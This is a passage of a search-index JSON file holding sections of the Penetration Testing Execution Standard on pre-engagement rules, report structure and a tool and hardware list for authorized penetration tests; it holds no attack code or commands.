categories and levels for different types of incidents.","title":"Incident Definition"},{"location":"pentest_standard/preengagemente/#status-report-frequency","text":"The frequency of status reporting can vary widely. Some factors which influence the reporting schedule include the overall length of the test, the test scope, and the target\u2019s security maturity. An effective schedule allows the customer to feel engaged. An ignored customer is a former customer. Once frequency and schedule of status reports has been set, it must be fulfilled. Postponing or delaying a status report may be necessary, but it should not become chronic. The client may be asked to agree to a new schedule if necessary. Skipping a status report altogether is unprofessional and should be avoided if at all possible.","title":"Status Report Frequency"},{"location":"pentest_standard/preengagemente/#pgp-and-other-alternatives","text":"Encryption is not optional. Communication with the customer is an absolutely necessary part of any penetration testing engagement and due to the sensitive nature of the engagement, communications of sensitive information must be encrypted, especially the final report. Before the testing begins, a means of secure communication must be established with the client. Several common means of encryption are as follows:","title":"PGP and Other Alternatives"},{"location":"pentest_standard/preengagemente/#pgpgpg-can-be-used-to-both-communicate-over-e-mail-and-to-encrypt-the-final-report-remember-that-subject-lines-are-passed-through-in-plaintext","text":"","title":"PGP/GPG can be used to both communicate over e-mail and to encrypt the final report (remember that subject lines are passed through in plaintext)"},{"location":"pentest_standard/preengagemente/#a-secure-mailbox-hosted-on-the-customers-network","text":"","title":"A secure mailbox hosted on the customer\u2019s network"},{"location":"pentest_standard/preengagemente/#telephone","text":"","title":"Telephone"},{"location":"pentest_standard/preengagemente/#face-to-face-meetings","text":"","title":"Face to face meetings"},{"location":"pentest_standard/preengagemente/#to-deliver-the-final-report-you-can-also-store-the-report-in-an-aes-encrypted-archive-file-but-make-sure-that-your-archive-utility-supports-aes-encryption-using-cbc","text":"Also ask what kinds of information can be put in writing and which should be communicated only verbally. Some organizations have very good reasons for limiting what security information is transmitted to them in writing.","title":"To deliver the final report, you can also store the report in an AES encrypted archive file, but make sure that your archive utility supports AES encryption using CBC."},{"location":"pentest_standard/preengagemente/#rules-of-engagement","text":"While the scope defines what will be tested, the rules of engagement defines how that testing is to occur. These are two different aspects which need to be handled independently from each other.","title":"Rules of Engagement"},{"location":"pentest_standard/preengagemente/#timeline","text":"A clear timeline should be established for the engagement. While scope defines the start and the end of an engagement, the rules of engagement define everything in between. It should be understood that the timeline will change as the test progresses. However, having a rigid timeline is not the goal of creating one. Rather, having a timeline in place at the beginning of a test will allow everyone involved to more clearly identify the work that is to be done and the people who will be responsible for said work. GANTT Charts and Work Breakdown Structures are often used to define the work and the amount of time that each specific piece of the work will take. Seeing the schedule broken down in this manner aids those involved in identifying where file_suport need to be applied and it helps the customer identify possible roadblocks which many be encountered during testing. There are a number of free GANTT Chart tools available on the Internet. Many mangers identify closely with these tools. Because of this, they are an excellent medium for communicating with the upper management of a target organization.","title":"Timeline"},{"location":"pentest_standard/preengagemente/#locations","text":"Another parameter of any given engagement which is important to establish with the customer ahead of time is any destinations to which the testers will need to travel during the test. This could be as simple as identifying local hotels, or complex as identifying the applicable laws of a specific target country. It is not uncommon for an organization to operate in multiple locations and regions and a few select sites will need to be chosen for testing. In these situations, travel to every customer location should be avoided, instead, it should be determined if VPN connections to the sites are available for remote testing. Disclosure of Sensitive Information While one of the goals of a given engagement may be to gain access to sensitive information, certain information should not actually be viewed or downloaded. This seems odd to newer testers, however, there are a number of situations where the testers should not have the target data in their possession. For example Personal Health Information (PHI), under the Health Insurance Portability and Accountability Act (HIPAA), this data must be protected. In some situations, the target system may not have a firewall or anti-virus (AV) protecting it. In this sort of situation, the testers being in possession of any and all Personally Identifiable Information (PII) should be absolutely avoided. However, if the data cannot be physically or virtually obtained, how can it be proved that the testers indeed obtained access to the information? This problem has been solved in a number of ways. There are ways to prove that the vault door was opened without taking any of the money. For instance, a screenshot of database schema and file permissions can be taken, or the files themselves can be displayed without opening them to displaying the content, as long as no PII is visible in the filenames themselves. How cautious the testers should be on a given engagement is a parameter which needs to be discussed with the client, but the firm doing the testing should always be sure to protect themselves in a legal sense regardless of client opinion. Regardless of supposed exposure to sensitive data, all report templates and tester machines should be sufficiently scrubbed following each engagement. As a special side note, if illegal data (i.e. child pornography) is discovered by the testers, proper law enforcement officials should be notified immediately, followed by the customer. Do not take direction from the customer.","title":"Locations"},{"location":"pentest_standard/preengagemente/#evidence-handling","text":"When handling evidence of a test and the differing stages of the report it is incredibly important to take extreme care with the data. Always use encryption and sanitize your test machine between tests. Never hand out USB sticks with test reports out at security conferences. And whatever you do, don't re-use a report from another customer engagement as a template! It's very unprofessional to leave references to another organization in your document.","title":"Evidence Handling"},{"location":"pentest_standard/preengagemente/#regular-status-meetings","text":"Throughout the testing process it is critical to have regular meetings with the customer informing them of the overall progress of the test. These meetings should be held daily and should be as short as possible. Meetings should be kept to three concepts: plans, progress and problems. Plans are generally discussed so that testing is not conducted during a major unscheduled change or an outage. Progress is simply an update to the customer on what has been completed so far. Problems should also be discussed in this meeting, but in the interest of brevity, conversations concerning solutions should almost always be taken offline.","title":"Regular Status Meetings"},{"location":"pentest_standard/preengagemente/#time-of-the-day-to-test","text":"Certain customers require all testing to be done outside of business hours. This can mean late nights for most testers. The time of day requirements should be well established with the customer before testing begins.","title":"Time of the Day to Test"},{"location":"pentest_standard/preengagemente/#dealing-with-shunning","text":"There are times where shunning is perfectly acceptable and there are times where it may not fit the spirit of the test. For example, if your test is to be a full black-box test where you are testing not only the technology, but the capabilities of the target organization\u2019s security team, shunning would be perfectly fine. However, when you are testing a large number of systems in coordination with the target organization's security team it may not be in the best interests of the test to shun your attacks.","title":"Dealing with Shunning"},{"location":"pentest_standard/preengagemente/#permission-to-test","text":"One of the most important documents which need to be obtained for a penetration test is the Permission to Test document. This document states the scope and contains a signature which acknowledges awareness of the activities of the testers. Further, it should clearly state that testing can lead to system instability and all due care will be given by the tester to not crash systems in the process. However, because testing can lead to instability the customer shall not hold the tester liable for any system instability or crashes. It is critical that testing does not begin until this document is signed by the customer. In addition, some service providers require advance notice and/or separate permission prior to testing their systems. For example, Amazon has an online request form that must be completed, and the request must be approved before scanning any hosts on their cloud. If this is required, it should be part of the document.","title":"Permission to Test"},{"location":"pentest_standard/preengagemente/#legal-considerations","text":"Some activities common in penetration tests may violate local laws. For this reason, it is advised to check the legality of common pentest tasks in the location where the work is to be performed. For example,any VOIP calls captured in the course of the penetration test may be considered wiretapping in some areas.","title":"Legal Considerations"},{"location":"pentest_standard/preengagemente/#capabilities-and-technology-in-place","text":"Good penetration tests do not simply check for un-patched systems. They also test the capabilities of the target organization. To that end, below is a list of things that you can benchmark while testing.","title":"Capabilities and Technology in Place"},{"location":"pentest_standard/preengagemente/#ability-to-detect-and-respond-to-information-gathering","text":"","title":"Ability to detect and respond to information gathering"},{"location":"pentest_standard/preengagemente/#ability-to-detect-and-respond-to-foot-printing","text":"","title":"Ability to detect and respond to foot printing"},{"location":"pentest_standard/preengagemente/#ability-to-detect-and-respond-to-scanning-and-vuln-analysis","text":"","title":"Ability to detect and respond to scanning and vuln analysis"},{"location":"pentest_standard/preengagemente/#ability-to-detect-and-respond-to-infiltration-attacks","text":"","title":"Ability to detect and respond to infiltration (attacks)"},{"location":"pentest_standard/preengagemente/#ability-to-detect-and-respond-to-data-aggregation","text":"","title":"Ability to detect and respond to data aggregation"},{"location":"pentest_standard/preengagemente/#ability-to-detect-and-respond-to-data-ex-filtration","text":"When tracking this information be sure to collect time information. For example, if a scan is detected you should be notified and note what level of scan you were preforming at the time.","title":"Ability to detect and respond to data ex-filtration"},{"location":"pentest_standard/report/","text":"Overview This document is intended to define the base criteria for penetration testing reporting. While it is highly encouraged to use your own customized and branded format, the following should provide a high level understanding of the items required within a report as well as a structure for the report to provide value to the reader. Report Structure The report is broken down into two (2) major sections in order to communicate the objectives, methods, and results of the testing conducted to various audiences. The Executive Summary This section will communicate to the reader the specific goals of the Penetration Test and the high level findings of the testing exercise. The intended audience will be those who are in charge of the oversight and strategic vision of the security program as well as any members of the organization which may be impacted by the identified/confirmed threats. The executive summary should contain most if not all of the following sections: '''Background:''' The background section should explain to the reader the overall purpose of the test. Details on the terms identified within the Pre Engagement section relating to risk, countermeasures, and testing goals should be present to connect the reader to the overall test objectives and the relative results. (Example: (CLIENT) tasked with performing an internal/external vulnerability assessment and penetration testing of specific systems located in (logical area or physical location). These systems have been identified as (risk ranking) and contain (data classification level) data which, if accessed inappropriately, could cause material harm to (Client). In an effort to test (CLIENT\u2019s) ability to defend against direct and indirect attack, executed a comprehensive network vulnerability scan, Vulnerability conformation( <-insert attack types agreed upon->) exploitation of weakened services, client side attacks, browser side attacks (etc) The purpose of this assessment was to verify the effectiveness of the security controls put in place by (CLIENT) to secure business-critical information. This report represents the findings from the assessment and the associated remediation recommendations to help CLIENT strengthen its security posture. If objectives were changed during the course of the testing then all changes must be listed in this section of the report. Additionally, the letter of amendment should be included in the appendix of the report and linked to from this section. '''Overall Posture:''' This area will be a narrative of the overall effectiveness of the test and the pentesters ability to achieve the goals set forth within the pre engagement sessions. A brief description of the Systemic (ex. Systemic issue# Lacking Effective Patch Management Process vs. Symptomatic# Found MS08-067 missing on xyz box) issues identified through the testing process as well as the ability to achieve access to the goal information and identify a potential impact to the business. '''Risk Ranking/Profile:''' The overall risk ranking/profile/score will be identified and explained in this area. In the pre engagement section the Pentester will identify the scoring mechanism and the individual mechanism for tracking/grading risk. Various methods from FAIR, DREAD, and other custom rankings will be consolidated into environmental scores and defined. [[image:reporting-risk-scale.png]] The \u201cOverall Risk Score\u201d for the (CLIENT) is currently a Seven (7). This rating implies an ELEVATED risk of security controls being compromised with the potential for material financial losses. The consultant determined this risk score based on one high risk and several medium risk vulnerabilities, along with the success of directed attack. The most severe vulnerability identified was the presence of default passwords in the corporate public facing website which allowed access to a number of sensitive documents and the ability to control content on the device. This vulnerability could lead to theft of user accounts, leakage of sensitive information, or full system compromise. Several lesser severe vulnerabilities could lead to theft of valid account credentials and leakage of information. '''General Findings:''' The general findings will provide a synopsis of the issues found during the penetration test in a basic and statistical format. Graphic representations of the targets tested, testing results, processes, attack scenarios, success rates, and other trendable metrics as defined within the pre engagement meeting should be present. In addition, the cause of the issues should be presented in an easy to read format. (ex. A graph showing the root cause of issues exploited) [[image:risk-origin.png]] If defined within the Pre engagement exercise, this area should also include metrics which depict the effectiveness of the countermeasures within the environment. (ex.. we ran x attacks and IPS blocked y. Other countermeasures should also have similar metrics of design vs. effectiveness.) '''Recommendation Summary:''' The recommendation section of the report should provide the reader with a high level understanding of the tasks needed to resolve the risks identified and the general level of effort required to implement the resolution path suggested. This section will also identify the weighting mechanisms used to prioritize the order of the road map following. '''Strategic Roadmap:''' Roadmaps should include a prioritized plan for remediation of the insecure items found and should be weighed against the business objectives/ level of potential impact. This section should map directly to the goals identified as well as the threat matrix created in the PTES-Threat modeling section. By breaking up into predefined time/objective based goals, this section will create a path of action to follow in various increments. Example: [[image:roadmap1.png]] [[image:roadmap2.png]] [[image:roadmap3.png]] Technical Report This section will communicate to the reader the technical details of the test and all of the aspects/components agreed upon as key success indicators within the pre engagement exercise. The technical report section will describe in detail the scope, information, attack path, impact and remediation suggestions of the test. '''Introduction:''' The introduction section of the technical report is intended to be an initial inventory of: *Personnel involved in the testing from both the Client and Penetration Testing Team *Contact information *Assets involved in testing *Objectives of Test *Scope of Test *Strength of Test *Approach *Threat/Grading Structure This section should be a reference for the specific file_suport involved in the testing and the overall technical scope of the test. '''Information Gathering:''' Intelligence gathering and information assessment are the foundations of a good penetration test. The more informed the tester is about the environment, the better the results of the test will be. In this section, a number of items should be written up to show the CLIENT the extent of public and private information available through the execution of the Intelligence gathering phase of PTES. At a minimum, the results identified should be presented in 4 basic categories: '''Passive Intelligence:''' Intelligence gathered from indirect analysis such as DNS,Google dorking for IP/infrastructure related information. This section will focus on the techniques used to profile the technology in the CLIENT environment WITHOUT sending any traffic directly to the assets. '''Active Intelligence:''' This section will show the methods and results of tasks such as infrastructure mapping, port scanning, and architecture assessment and other foot printing activities. This section will focus on the techniques used to profile the technology in the CLIENT environment by sending traffic DIRECTLY to the assets. '''Corporate Intelligence:''' Information about the structure of the organization, business units, market share, vertical, and other corporate functions should be mapped to both business process and the previously identified physical assets being tested. '''Personnel Intelligence:''' Any and all information found during the intelligence collection phase which maps users to the CLIENT organization. This section should show the techniques used to harvest intelligence such as public/private employee depots, mail repositories, org charts and other items leading to the connection of employee/company. '''Vulnerability Assessment:''' Vulnerability assessment is the act of identifying the POTENTIAL vulnerabilities which exist in a TEST and the threat classification of each threat. In this section, a definition of the methods used to identify the vulnerability as well as the evidence/classification of the vulnerability should be present. In addition this section should include: *Vulnerability Classification Levels *Technical Vulnerabilities **OSI Layer Vulns **Scanner Found **Manually identified **Overall Exposure *Logical Vulnerabilities **NON OSI Vuln **Type of vuln **How/Where it is found **Exposure *Summary of Results '''Exploitation/ Vulnerability Confirmation:''' Exploitation or Vulnerability confirmation is the act of triggering the vulnerabilities identified in the previous sections to gain a specified level of access to the target asset. This section should review, in detail, all of the steps taken to confirm the defined vulnerability as well as the following: *Exploitation Timeline *Targets selected for Exploitation *Exploitation Activities **Directed Attack ***Target Hosts unable to be Exploited ***Target Hosts able to be Exploited ****Individual Host Information ****Attacks conducted ****Attacks Successful ****Level of access Granted +escalation path ****Remediation *****Link to Vuln section reference *****Additional Mitigating technique *****Compensating control suggestion *Indirect Attack **Phishing ***Timeline/details of attack ***Targets identified ***Success/Fail ratio ***Level of access granted **Clientside ***Timeline/details of attack ***Targets identified ***Success/Fail ratio ***Level of access granted **Browser Side ***Timeline/details of attack ***Targets identified ***Success/Fail ratio ***Level of access granted '''Post Exploitation:''' One of the most critical items in all testing is the connection to ACTUAL impact on the CLIENT being tested. While the sections above relay the technical nature of the vulnerability and the ability to successfully take advantage of the flaw, the Post Exploitation section should tie the ability of exploitation to the actual risk to the business. In this area the following items should be evidenced through the use of screenshots, rich content retrieval, and examples of real world privileged user access: *Privilege Escalation path **Technique used *Acquisition of Critical Information Defined by client *Value of information *Access to core business systems *Access to compliance protected data sets *Additional Information/Systems Accessed *Ability of persistence *Ability for exfiltration *Countermeasure Effectiveness *: This section should cover the effectiveness of countermeasures that are in place on the systems in scope. It should include sections on both active (proactive) and passive (reactive) countermeasures, as well as detailed information on any incident response activities triggered during the testing phase. A listing of countermeasures that were effective in resisting assessment activities will help the CLIENT better tune detection systems and processes to handle future intrusion attempts. **Detection Capability ***FW/WAF/IDS/IPS ***Human ***DLP ***Log **Response & effectiveness '''Risk/Exposure:''' Once the direct impact to the business is qualified through the evidence existing in the vulnerability, exploitation and post exploitation sections, the risk quantification can be conducted. In this section the results above are combined with the risk values, information criticality, corporate valuation, and derived business impact from the pre engagement section. This will give the CLIENT the ability to identify, visualize and monetize the vulnerabilities found throughout the testing and effectively weight their resolution against the CLIENTS business objectives. This section will cover the business risk in the following subsections: *Evaluate incident frequency **probable event frequency **estimate threat capability (from 3 - threat modeling) **Estimate controls strength (6) **Compound vulnerability (5) **Level of skill required **Level of access required *Estimate loss magnitude per incident **Primary loss **Secondary loss **Identify risk root cause analysis ***Root Cause is never a patch ***Identify Failed Processes *Derive Risk **Threat **Vulnerability **Overlap '''Conclusion:''' Final overview of the test. It is suggested that this section echo portions of the overall test as well as support the growth of the CLIENT security posture. It should end on a positive note with the support and guidance to enable progress in the security program and a regimen of testing/security activity in the future to come.","title":"Reporting"},{"location":"pentest_standard/report/#overview","text":"This document is intended to define the base criteria for penetration testing reporting. While it is highly encouraged to use your own customized and branded format, the following should provide a high level understanding of the items required within a report as well as a structure for the report to provide value to the reader.","title":"Overview"},{"location":"pentest_standard/report/#report-structure","text":"The report is broken down into two (2) major sections in order to communicate the objectives, methods, and results of the testing conducted to various audiences.","title":"Report Structure"},{"location":"pentest_standard/report/#the-executive-summary","text":"This section will communicate to the reader the specific goals of the Penetration Test and the high level findings of the testing exercise. The intended audience will be those who are in charge of the oversight and strategic vision of the security program as well as any members of the organization which may be impacted by the identified/confirmed threats. The executive summary should contain most if not all of the following sections: '''Background:''' The background section should explain to the reader the overall purpose of the test. Details on the terms identified within the Pre Engagement section relating to risk, countermeasures, and testing goals should be present to connect the reader to the overall test objectives and the relative results. (Example: (CLIENT) tasked with performing an internal/external vulnerability assessment and penetration testing of specific systems located in (logical area or physical location). These systems have been identified as (risk ranking) and contain (data classification level) data which, if accessed inappropriately, could cause material harm to (Client). In an effort to test (CLIENT\u2019s) ability to defend against direct and indirect attack, executed a comprehensive network vulnerability scan, Vulnerability conformation( <-insert attack types agreed upon->) exploitation of weakened services, client side attacks, browser side attacks (etc) The purpose of this assessment was to verify the effectiveness of the security controls put in place by (CLIENT) to secure business-critical information. This report represents the findings from the assessment and the associated remediation recommendations to help CLIENT strengthen its security posture. If objectives were changed during the course of the testing then all changes must be listed in this section of the report. Additionally, the letter of amendment should be included in the appendix of the report and linked to from this section. '''Overall Posture:''' This area will be a narrative of the overall effectiveness of the test and the pentesters ability to achieve the goals set forth within the pre engagement sessions. A brief description of the Systemic (ex. Systemic issue# Lacking Effective Patch Management Process vs. Symptomatic# Found MS08-067 missing on xyz box) issues identified through the testing process as well as the ability to achieve access to the goal information and identify a potential impact to the business. '''Risk Ranking/Profile:''' The overall risk ranking/profile/score will be identified and explained in this area. In the pre engagement section the Pentester will identify the scoring mechanism and the individual mechanism for tracking/grading risk. Various methods from FAIR, DREAD, and other custom rankings will be consolidated into environmental scores and defined. [[image:reporting-risk-scale.png]] The \u201cOverall Risk Score\u201d for the (CLIENT) is currently a Seven (7). This rating implies an ELEVATED risk of security controls being compromised with the potential for material financial losses. The consultant determined this risk score based on one high risk and several medium risk vulnerabilities, along with the success of directed attack. The most severe vulnerability identified was the presence of default passwords in the corporate public facing website which allowed access to a number of sensitive documents and the ability to control content on the device. This vulnerability could lead to theft of user accounts, leakage of sensitive information, or full system compromise. Several lesser severe vulnerabilities could lead to theft of valid account credentials and leakage of information. '''General Findings:''' The general findings will provide a synopsis of the issues found during the penetration test in a basic and statistical format. Graphic representations of the targets tested, testing results, processes, attack scenarios, success rates, and other trendable metrics as defined within the pre engagement meeting should be present. In addition, the cause of the issues should be presented in an easy to read format. (ex. A graph showing the root cause of issues exploited) [[image:risk-origin.png]] If defined within the Pre engagement exercise, this area should also include metrics which depict the effectiveness of the countermeasures within the environment. (ex.. we ran x attacks and IPS blocked y. Other countermeasures should also have similar metrics of design vs. effectiveness.) '''Recommendation Summary:''' The recommendation section of the report should provide the reader with a high level understanding of the tasks needed to resolve the risks identified and the general level of effort required to implement the resolution path suggested. This section will also identify the weighting mechanisms used to prioritize the order of the road map following. '''Strategic Roadmap:''' Roadmaps should include a prioritized plan for remediation of the insecure items found and should be weighed against the business objectives/ level of potential impact. This section should map directly to the goals identified as well as the threat matrix created in the PTES-Threat modeling section. By breaking up into predefined time/objective based goals, this section will create a path of action to follow in various increments. Example: [[image:roadmap1.png]] [[image:roadmap2.png]] [[image:roadmap3.png]]","title":"The Executive Summary"},{"location":"pentest_standard/report/#technical-report","text":"This section will communicate to the reader the technical details of the test and all of the aspects/components agreed upon as key success indicators within the pre engagement exercise. The technical report section will describe in detail the scope, information, attack path, impact and remediation suggestions of the test. '''Introduction:''' The introduction section of the technical report is intended to be an initial inventory of: *Personnel involved in the testing from both the Client and Penetration Testing Team *Contact information *Assets involved in testing *Objectives of Test *Scope of Test *Strength of Test *Approach *Threat/Grading Structure This section should be a reference for the specific file_suport involved in the testing and the overall technical scope of the test. '''Information Gathering:''' Intelligence gathering and information assessment are the foundations of a good penetration test. The more informed the tester is about the environment, the better the results of the test will be. In this section, a number of items should be written up to show the CLIENT the extent of public and private information available through the execution of the Intelligence gathering phase of PTES. At a minimum, the results identified should be presented in 4 basic categories: '''Passive Intelligence:''' Intelligence gathered from indirect analysis such as DNS,Google dorking for IP/infrastructure related information. This section will focus on the techniques used to profile the technology in the CLIENT environment WITHOUT sending any traffic directly to the assets. '''Active Intelligence:''' This section will show the methods and results of tasks such as infrastructure mapping, port scanning, and architecture assessment and other foot printing activities. This section will focus on the techniques used to profile the technology in the CLIENT environment by sending traffic DIRECTLY to the assets. '''Corporate Intelligence:''' Information about the structure of the organization, business units, market share, vertical, and other corporate functions should be mapped to both business process and the previously identified physical assets being tested. '''Personnel Intelligence:''' Any and all information found during the intelligence collection phase which maps users to the CLIENT organization. This section should show the techniques used to harvest intelligence such as public/private employee depots, mail repositories, org charts and other items leading to the connection of employee/company. '''Vulnerability Assessment:''' Vulnerability assessment is the act of identifying the POTENTIAL vulnerabilities which exist in a TEST and the threat classification of each threat. In this section, a definition of the methods used to identify the vulnerability as well as the evidence/classification of the vulnerability should be present. In addition this section should include: *Vulnerability Classification Levels *Technical Vulnerabilities **OSI Layer Vulns **Scanner Found **Manually identified **Overall Exposure *Logical Vulnerabilities **NON OSI Vuln **Type of vuln **How/Where it is found **Exposure *Summary of Results '''Exploitation/ Vulnerability Confirmation:''' Exploitation or Vulnerability confirmation is the act of triggering the vulnerabilities identified in the previous sections to gain a specified level of access to the target asset. This section should review, in detail, all of the steps taken to confirm the defined vulnerability as well as the following: *Exploitation Timeline *Targets selected for Exploitation *Exploitation Activities **Directed Attack ***Target Hosts unable to be Exploited ***Target Hosts able to be Exploited ****Individual Host Information ****Attacks conducted ****Attacks Successful ****Level of access Granted +escalation path ****Remediation *****Link to Vuln section reference *****Additional Mitigating technique *****Compensating control suggestion *Indirect Attack **Phishing ***Timeline/details of attack ***Targets identified ***Success/Fail ratio ***Level of access granted **Clientside ***Timeline/details of attack ***Targets identified ***Success/Fail ratio ***Level of access granted **Browser Side ***Timeline/details of attack ***Targets identified ***Success/Fail ratio ***Level of access granted '''Post Exploitation:''' One of the most critical items in all testing is the connection to ACTUAL impact on the CLIENT being tested. While the sections above relay the technical nature of the vulnerability and the ability to successfully take advantage of the flaw, the Post Exploitation section should tie the ability of exploitation to the actual risk to the business. In this area the following items should be evidenced through the use of screenshots, rich content retrieval, and examples of real world privileged user access: *Privilege Escalation path **Technique used *Acquisition of Critical Information Defined by client *Value of information *Access to core business systems *Access to compliance protected data sets *Additional Information/Systems Accessed *Ability of persistence *Ability for exfiltration *Countermeasure Effectiveness *: This section should cover the effectiveness of countermeasures that are in place on the systems in scope. It should include sections on both active (proactive) and passive (reactive) countermeasures, as well as detailed information on any incident response activities triggered during the testing phase. A listing of countermeasures that were effective in resisting assessment activities will help the CLIENT better tune detection systems and processes to handle future intrusion attempts. **Detection Capability ***FW/WAF/IDS/IPS ***Human ***DLP ***Log **Response & effectiveness '''Risk/Exposure:''' Once the direct impact to the business is qualified through the evidence existing in the vulnerability, exploitation and post exploitation sections, the risk quantification can be conducted. In this section the results above are combined with the risk values, information criticality, corporate valuation, and derived business impact from the pre engagement section. This will give the CLIENT the ability to identify, visualize and monetize the vulnerabilities found throughout the testing and effectively weight their resolution against the CLIENTS business objectives. This section will cover the business risk in the following subsections: *Evaluate incident frequency **probable event frequency **estimate threat capability (from 3 - threat modeling) **Estimate controls strength (6) **Compound vulnerability (5) **Level of skill required **Level of access required *Estimate loss magnitude per incident **Primary loss **Secondary loss **Identify risk root cause analysis ***Root Cause is never a patch ***Identify Failed Processes *Derive Risk **Threat **Vulnerability **Overlap '''Conclusion:''' Final overview of the test. It is suggested that this section echo portions of the overall test as well as support the growth of the CLIENT security posture. It should end on a positive note with the support and guidance to enable progress in the security program and a regimen of testing/security activity in the future to come.","title":"Technical Report"},{"location":"pentest_standard/tecguidelines/","text":"This section is designed to be the PTES technical guidelines that help define certain procedures to follow during a penetration test. Something to be aware of is that these are only baseline methods that have been used in the industry. They will need to be continuously updated and changed upon by the community as well as within your own standard. Guidelines are just that, something to drive you in a direction and help during certain scenarios, but not an all encompassing set of instructions on how to perform a penetration test. Think outside of the box. [[Image:PTES-TG_Logo.png|center|frameless|300px]] Tools Required Selecting the tools required during a penetration test depends on several factors such as the type and the depth of the engagement. In general terms, the following tools are mandatory to complete a penetration test with the expected results. Operating Systems Selecting the operating platforms to use during a penetration test is often critical to the successfully exploitation of a network and associated system. As such it is a requirement to have the ability to use the three major operating systems at one time. This is not possible without virtualization. MacOS X MacOS X is a BSD-derived operating. With standard command shells (such as ''sh'', ''csh'', and ''bash'') and native network utilities that can be used during a penetration test (including ''telnet'', ''ftp'', ''rpcinfo'', ''snmpwalk'', ''host'', and ''dig'') it is the system of choice and is the underlying host system for our penetration testing tools. Since this is a hardware platform as well, this makes the selection of specific hardware extremely simple and ensures that all tools will work as designed. VMware Workstation VMware Workstation is an absolute requirement to allow multiple instances of operating systems easily on a workstation. VMware Workstation is a fully supported commercial package, and offers encryption capabilities and snapshot capabilities that are not available in the free versions available from VMware. Without the ability to encrypt the data collected on a VM confidential information will be at risk, therefore versions that do not support encryption are not to be used. The operating systems listed below should be run as a guest system within VMware. Linux Linux is the choice of most security consultants. The Linux platform is versatile, and the system kernel provides low-level support for leading-edge technologies and protocols. All mainstream IP-based attack and penetration tools can be built and run under Linux with no problems. For this reason, BackTrack is the platform of choice as it comes with all the tools required to perform a penetration test. Windows XP/7 Windows XP/7 is required for certain tools to be used. Many commercial tools or Microsoft specific network assessment and penetration tools are available that run cleanly on the platform. Radio Frequency Tools Frequency Counter A Frequency Counter should cover from 10Hz- 3 GHz. A good example of a reasonably priced frequency counter is the MFJ-886 Frequency Counter. Frequency Scanner A scanner is a radio receiver that can automatically tune, or scan, two or more discrete frequencies, stopping when it finds a signal on one of them and then continuing to scan other frequencies when the initial transmission ceases. These are not to be used in Florida, Kentucky, or Minnesota unless you are a person who holds a current amateur radio license issued by the Federal Communications Commission. The required hardware is the Uniden BCD396T Bearcat Handheld Digital Scanner or PSR-800 GRE Digital trunking scanner. Spectrum Analyzer A spectrum analyzer is a device used to examine the spectral composition of some electrical, acoustic, or optical waveform. A spectrum analyzer is used to determine whether or not a wireless transmitter is working according to federally defined standards and is used to determine, by direct observation, the bandwidth of a digital or analog signal. A good example of a reasonably priced spectrum analyzer is the Kaltman Creations HF4060 RF Spectrum Analyzer. 802.11 USB adapter An 802.11 USB adapter allow for the easy connection of a wireless adapter to the penetration testing system. There are several issues with using something other than the approved USB adapter as not all of them support the required functions. The required hardware is the Alfa AWUS051NH 500mW High Gain 802.11a/b/g/n high power Wireless USB. External Antennas External antennas come in a variety of shapes, based upon the usage and with a variety of connectors. All external antennas must have RP-SMA connectors that are compatible with the Alfa. Since the Alfa comes with an Omni-directional antenna, we need to obtain a directional antenna. The best choice is a panel antenna as it provides the capabilities required in a package that travels well. The required hardware is the L-com 2.4 GHz 14 dBi Flat Panel Antenna with RP-SMA connector. A good magnetic mount Omni-directional antenna such as the L-com 2.4 GHz/900 MHz 3 dBi Omni Magnetic Mount Antenna with RP-SMA Plug Connector is a good choice. USB GPS A GPS is a necessity to properly perform an RF assessment. Without this it's simply impossible to determine where and how far RF signals are propagating. There are numerous options are available, therefore you should look to obtain a USB GPS that is supported on operating system that you are using be that Linux, Windows and Mac OS X. Software The software requirements are based upon the engagement scope, however we ' ve listed some commercial and open source software that could be required to properly conduct a full penetration test. {|border#\"2\" cellspacing#\"0\" cellpadding#\"4\" width#\"100%\" | '''Software''' | '''URL''' | '''Description''' | '''Windows Only''' |- |Maltego | http://www.paterva.com/web5 |The defacto standard for mining data on individuals and companies. Comes in a free community version and paid version. | |- |Nessus | http://tenable.com/products/nessus |A vulnerabilty scanning tool available in paid and free versions. Nessus is useful for finding and documenting vulnerabilities mostly from the inside of a given network. | |- |IBM AppScan | http://www-01.ibm.com/software/awdtools/appscan |IBM's automated Web application security testing suite. |'''*''' |- |eEye Retina | http://www.eeye.com/Products/Retina.aspx |Retina is an an automated network vulnerability scanner that can be managed from a single web-based console. It can be used in conjunction with Metasploit where if an exploit exists in Metasploit, it can be launched directly from Retina to verify that the vulnerability exists. | |- |Nexpose | http://www.rapid7.com |Nexpose is a vulnerability scanner from the same company that brings you Metasploit. Available in both free and paid versions that differ in levels of support and features. | |- |OpenVAS | http://www.openvas.org |OpenVAS is a vulnerability scanner that originally started as a fork of the Nessus project. The actual security scanner is accompanied with a daily updated feed of Network Vulnerability Tests (NVTs), over 20,000 in total (as of January 2011) | |- |HP WebInspect | https://www.fortify.com/products/web_inspect.html |HP WebInspect performs web application security testing and assessment for complex web applications. Supports JavaScript, Flash, Silverlight and others. |'''*''' |- |HP SWFScan | https://h30406.www3.hp.com/campaigns/2009/wwcampaign/1-5TUVE/index.php?key#swf |HP SWFScan is a free tool developed by HP Web Security Research Group to automatically find security vulnerabilities in applications built on the Flash platform. Useful for decompiling flash apps and finding hard-coded credentials, etc. |'''*''' |- |Backtrack Linux |[ http://www.backtrack-linux.org ] |One of the most complete penetration testing Linux distributions available. Includes many of the more popular free pentesting tools but is based on Ubuntu so it's also easily expandable. Can be run on Live CD, USB key, VM or installed on a hard drive. | |- |SamuraiWTF (Web Testing Framework) | http://samurai.inguardians.com |A live Linux distribution built for the specific purpose of web application scanning. Includes tools such as Fierce, Maltego, WebScarab, BeEF any many more tools specific to web application testing. | |- |SiteDigger | http://www.mcafee.com/us/downloads/free-tools/sitedigger.aspx |SiteDigger 3.0 is a free tool that runs on Windows. It searches Google\u2019s cache to look for vulnerabilities, errors, configuration issues, proprietary information, and interesting security nuggets on web sites. |'''*''' |- |FOCA | http://www.informatica64.com/DownloadFOCA |FOCA is a tool that allows you to find out more about a website by (amongst other things) analysing the metadata in any documents it makes available. |'''*''' |- |THC IPv6 Attack Toolkit | http://www.thc.org/thc-ipv6 |The largest single collection of tools designed to exploit vulnerabilities in the IPv6 and ICMP6 protocols. | |- |THC Hydra | http://thc.org/thc-hydra/ |Hydra is a very fast network logon brute force cracker which can attack many different services and file_suport. |'''*''' |- |Cain | http://www.oxid.it/cain.html |Cain & Abel is a password recovery tool that runs on Windows. It allows easy recovery of various kind of passwords by sniffing the network, cracking encrypted passwords using Dictionary, Brute-Force and Cryptanalysis attacks, recording VoIP conversations, decoding 